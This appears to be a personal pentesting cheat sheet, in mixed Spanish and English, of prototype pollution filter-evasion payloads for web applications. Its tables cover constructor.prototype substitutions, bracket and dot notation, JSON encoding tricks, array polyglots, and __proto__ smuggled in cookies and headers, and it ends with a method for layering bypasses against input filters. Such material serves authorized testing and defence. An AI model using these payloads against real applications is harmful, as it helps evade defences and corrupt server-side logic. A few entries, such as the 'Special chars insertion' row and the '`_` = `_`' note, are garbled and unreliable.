---
aliases:
  - PP Bypass
  - Prototype Pollution Filter Evasion
tags:
  - type/cheatsheet
  - vuln/prototype-pollution
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Prototype Pollution]]'
---
# Prototype Pollution - Bypasses y Filter Evasion

***

## `__proto__` Blocked → `constructor.prototype`

| **Filter** | **Bypass** | **Notas** |
|:---:|:---:|:---:|
| Filter `__proto__` literal | Usar `constructor.prototype` | Equivalente — modifica prototype también. |
| Payload constructor | `{"constructor":{"prototype":{"polluted":"yes"}}}` | Standard bypass. |
| Filter ambos | Buscar otras chains: `Object.constructor.prototype` | Walk further. |
| Filter top-level keys | `{"a":{"__proto__":{"polluted":"yes"}}}` | Nested keys pasan checks de top-level. |
| Filter substring `proto` | `constructor.prototype` no contiene `proto` | Substring filter bypass. |
| Filter regex `/proto/i` | `constructor[\\u0070rototype]` | Unicode escape. |
| Filter regex strict | Usar Object.defineProperty pattern (raro) | Edge case. |
| Lodash <4.17.21 | `__proto__` filtered, `constructor.prototype` works | Common reality. |
| Filter `prototype` también | Buscar property paths alternativos | Less común. |
| Map / Set objects | Map/Set tienen propios prototypes | Niche. |
^pp-bypass-constructor

___

## Notación Bracket vs Dot

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Dot notation (lodash set) | `_.set(obj, '__proto__.polluted', 'yes')` | Default. |
| Bracket array notation | `_.set(obj, ['__proto__','polluted'], 'yes')` | Bypass de filter en string parsing. |
| URL bracket | `?obj[__proto__][polluted]=yes` | qs lib. |
| URL dot | `?obj.__proto__.polluted=yes` | Other parsers. |
| URL mixed | `?obj[__proto__].polluted=yes` | Some parsers. |
| JSON nested | `{"obj":{"__proto__":{"polluted":"yes"}}}` | Standard. |
| JSON with dot in key | `{"obj.__proto__.polluted":"yes"}` | Si parser hace deep set por dot. |
| Bracket numeric | `?[0][__proto__][x]=y` | Array index notation. |
| Mixed encoding | `?[%5F%5Fproto%5F%5F]=...` | URL-encoded `__proto__`. |
| Special chars insertion | `__proto__` | Unicode escape en JSON. |
^pp-bypass-notation

___

## JSON Encoding Tricks

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Unicode escape | `{"\\u005f\\u005fproto\\u005f\\u005f":{"x":"y"}}` | `_` = `_`. |
| Hex escape JSON | NO existe — JSON solo soporta `\u` | (incorrect; safe). |
| Spaces/whitespace | `{"__proto__"  :  {"x":"y"}}` | Algunos filters strict regex. |
| Trailing comma | `{"__proto__":{"x":"y"},}` | JSON5 / lax parsers. |
| Comments JSON5 | `{"__proto__"/*comment*/:{"x":"y"}}` | JSON5 only. |
| Number key | `{"0":{"__proto__":...}}` | Index 0 + nested. |
| Empty key | `{"":{"__proto__":...}}` | Empty string key — some parsers buggy. |
| Duplicated key | `{"__proto__":1,"__proto__":{"x":"y"}}` | Last wins en mayoría. |
| Boolean key (no válido JSON) | n/a | n/a. |
| Float key | `{"1.5":{"__proto__":...}}` | Edge. |
^pp-bypass-encoding

___

## Array vs Object Polyglot

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Array index `__proto__` | `[1,2,{"__proto__":{"x":"y"}}]` | Inside array element. |
| Array as top-level | `[{"__proto__":{"x":"y"}}]` | Array root. |
| Mixed array | `[null, "x", {"__proto__":...}]` | Heterogeneous. |
| Length confusion | `{"__proto__":{"length":99999}}` | Affecting array iteration. |
| Array prototype pollution | Pollute Array.prototype específicamente | `[].push` etc affected. |
| Combine con number param | `?[]=1&__proto__[x]=y` | qs array notation. |
| Array tuple | `[["__proto__",{"x":"y"}]]` | Nested array structure. |
| Buffer / TypedArray | Polluciar Buffer.prototype | Node-specific. |
| Object spread to array | `[...obj]` con polluted obj | Edge case. |
^pp-bypass-array

___

## Header / Cookie Smuggling

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Cookie con `__proto__` | `Cookie: __proto__=...` | Si lib parsing es vulnerable. |
| Cookie nested | `Cookie: obj=__proto__:value` | Custom parsers. |
| Header value JSON | `X-Config: {"__proto__":{"x":"y"}}` | If app parses header como JSON. |
| Multi-line header | Folded headers con keys | Edge. |
| WS subprotocol | `Sec-WebSocket-Protocol: __proto__` | If parsed. |
| User-Agent JSON | UA con JSON (bizarro) | Custom apps. |
| GraphQL operationName | `?operationName=__proto__` | If used as key. |
| OAuth state JSON | State param con JSON | Custom flows. |
| Authorization header | Bearer token JSON-style | Edge. |
^pp-bypass-header

### Patrón general bypass

```
1. Identificar filtro:
   - Substring match (__proto__, proto, prototype)
   - Regex (case sensitive / insensitive)
   - Type-based (object vs array)
   - Position-based (top-level vs nested)

2. Aplicar bypass por capa:
   - Substring: usar constructor.prototype, encoding, escape
   - Regex: notación distinta (bracket/dot/array)
   - Type: array wrap, polyglot
   - Position: nested deep

3. Combinar capas:
   - constructor.prototype + nested + URL bracket notation
   - Unicode escape + JSON nested
```

***
